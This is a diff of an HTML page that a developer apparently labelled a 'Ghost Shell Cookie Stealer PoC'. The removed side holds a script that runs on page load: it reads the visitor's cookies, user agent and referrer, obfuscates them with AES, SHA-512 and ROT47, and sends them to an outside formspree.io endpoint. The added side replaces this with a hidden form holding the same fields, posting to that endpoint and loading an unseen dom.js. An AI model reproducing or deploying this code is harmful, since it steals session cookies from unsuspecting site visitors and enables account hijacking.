@@ -3,86 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stealth Encoder</title>
+    <title>Ghost Shell Cookie Stealer PoC</title>
     <style>
         body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
+            background-color: black; /* Black background */
+            color: white; /* Default text color */
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
+            flex-direction: column;
+            font-family: Arial, sans-serif;
         }
         h2 {
-            color: gold;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+            text-align: center;
+            color: gold; /* Gold text */
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); /* Glowing effect */
+        }
+        form {
+            display: none; /* Hidden form */
         }
     </style>
 </head>
 <body>
-    <h2>Stealth Encoder</h2>
 
-    <script>
-        (() => {
-            async function encryptAES(text, secret) {
-                const encoder = new TextEncoder();
-                const keyMaterial = await crypto.subtle.importKey("raw", encoder.encode(secret), { name: "PBKDF2" }, false, ["deriveKey"]);
-                const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: encoder.encode("SuperSalt"), iterations: 100000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, true, ["encrypt"]);
-                
-                const iv = crypto.getRandomValues(new Uint8Array(12));
-                const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoder.encode(text));
-                return btoa(String.fromCharCode(...iv) + String.fromCharCode(...new Uint8Array(encrypted)));
-            }
+    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
 
-            function rot47(str) {
-                return str.replace(/[\x21-\x7E]/g, c =>
-                    String.fromCharCode(33 + ((c.charCodeAt(0) + 14) % 94))
-                );
-            }
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
+        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
+        <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
+        <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
+        <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
+        <button type="submit" name="submitButton">Send</button>
+    </form>
 
-            async function hashSHA512(data) {
-                const encoder = new TextEncoder();
-                const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
-                return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, "0")).join("");
-            }
+    <script src="dom.js"></script>
 
-            async function stealthEncode() {
-                const secretKey = "UltraHiddenKey";
-                const cookies = document.cookie || "No_Cookies";
-                const userAgent = navigator.userAgent || "Unknown_User_Agent";
-                const referrer = document.referrer || "No_Referrer";
-
-                const encryptedCookies = await encryptAES(cookies, secretKey);
-                const hashedAgent = await hashSHA512(userAgent);
-                const encodedReferrer = rot47(referrer);
-
-                const stealthPayload = JSON.stringify({ encryptedCookies, hashedAgent, encodedReferrer });
-                const encodedData = btoa(stealthPayload);
-
-                console.log("Sending Encrypted Data:", encodedData); // Debugging
-
-                try {
-                    const response = await fetch("https://formspree.io/f/xeoqzkqe", {
-                        method: "POST",
-                        headers: { 
-                            "Content-Type": "application/json",
-                            "Accept": "application/json"  // Helps with some CORS policies
-                        },
-                        mode: "cors", // Ensures cross-origin compatibility
-                        body: JSON.stringify({ data: encodedData })
-                    });
-
-                    if (!response.ok) throw new Error("Server responded with error");
-                    console.log("Data Sent Successfully!");
-                } catch (error) {
-                    console.error("CORS/CSP Issue Detected:", error);
-                }
-            }
-
-            stealthEncode();
-        })();
-    </script>
 </body>
 </html>
